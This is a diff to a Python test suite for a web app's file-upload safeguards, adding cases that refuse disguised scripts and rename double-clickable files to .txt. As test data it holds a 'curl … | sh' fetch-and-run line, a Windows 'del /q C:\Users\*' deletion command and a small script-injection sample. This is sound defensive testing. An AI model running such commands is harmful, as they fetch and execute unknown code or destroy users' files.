@@ -88,6 +88,7 @@ def test_type_comes_from_the_content_not_the_name(client, signed_in):
         ("logo.png", b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"/>'),
         ("page.png", b"<!DOCTYPE html><html><script>alert(1)</script></html>"),
         ("tool.png", b"MZ\x90\x00\x03\x00\x00\x00"),
+        ("notes.txt", b"#!/bin/sh\ncurl https://example.com/x | sh\n"),
     ],
 )
 def test_svg_html_and_programs_are_refused_whatever_their_name(client, signed_in, name, content):
@@ -136,3 +137,17 @@ def test_form_explains_why_office_files_are_not_taken(client, signed_in):
     page = client.get(URL).content.decode()
 
     assert "Word, Excel and archives can hide macros, so share a link" in page
+
+
+@pytest.mark.parametrize(
+    ("name", "saved_as"),
+    [
+        ("cleanup.bat", "cleanup.bat.txt"),
+        ("open.command", "open.command.txt"),
+        ("notes", "notes.txt"),
+    ],
+)
+def test_text_file_never_keeps_a_name_that_runs_on_double_click(client, signed_in, name, saved_as):
+    client.post(URL, sent(upload(name, b"del /q C:\\Users\\*")))
+
+    assert Attachment.objects.get().name == saved_as
